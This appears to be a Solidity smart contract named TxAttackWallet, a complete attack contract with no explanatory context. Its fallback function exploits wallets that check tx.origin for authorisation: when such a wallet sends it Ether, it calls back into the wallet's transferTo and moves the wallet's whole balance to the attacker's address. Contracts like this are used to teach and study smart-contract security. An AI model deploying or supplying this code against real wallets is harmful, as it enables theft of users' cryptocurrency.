pragma solidity ^0.4.25;

interface TxUserWallet {
    function transferTo(address dest, uint amount) external payable;
    function balance() external;
}

contract TxAttackWallet {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function() public payable {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
    
    function balance() public view returns (uint256) {
        return address(this).balance;
    }
}
